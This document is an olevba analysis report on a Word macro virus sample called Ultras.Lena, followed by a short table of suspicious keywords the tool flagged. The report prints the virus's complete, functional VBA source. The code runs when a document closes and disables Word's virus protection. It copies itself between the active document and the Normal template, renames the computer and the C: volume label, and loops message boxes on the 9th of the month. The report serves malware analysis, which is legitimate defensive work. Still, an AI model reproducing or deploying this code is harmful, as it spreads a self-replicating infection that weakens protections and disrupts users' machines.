olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ultras.Lena-4c34e501edd7742ced547824d94901bc4a1025d2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ultras.Lena-4c34e501edd7742ced547824d94901bc4a1025d2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Lena.bas 
in file: Virus.MSWord.Ultras.Lena-4c34e501edd7742ced547824d94901bc4a1025d2 - OLE stream: 'Macros/VBA/Lena'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Declare Function SetComputerName Lib "kernel32" Alias "SetComputerNameA" (ByVal lpComputerName As String) As Long
Declare Function SetVolumeLabel Lib "kernel32" Alias "SetVolumeLabelA" (ByVal lpRootPathName As String, ByVal lpVolumeName As String) As Long
Sub auTOclosE()
On Error GoTo ULTRAS
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Application.UserName = "Lena"
Application.UserInitials = "L.B"
DocInfect = False
GlobInfect = False
Set ActiveDoc = ActiveDocument
Set GlobalDoc = NormalTemplate
For L = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(L).Name = "Lena" Then
DocInfect = True
End If
Next
For U = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(U).Name = "Lena" Then
GlobInfect = True
End If
Next
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Lena", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs fiLename:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Lena", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
Application.DisplayAlerts = wdAlertsAll
If WeekDay(Now()) = Int(Rnd() * 7 + 1) Then
Lcomputer = SetComputerName("Lena")
Ldisk = SetVolumeLabel("C:\", "Lena")
End If
If Day(Now()) = 9 Then
Do
MsgBox "I Lena you Lena!!!", vbCritical + vbOKOnly, "ULTRAS"
Loop
ActiveDocument.Password = "Lena"
ActiveDocument.Save
End If
ULTRAS:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auTOclosE           |Runs when the Word document is closed        |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

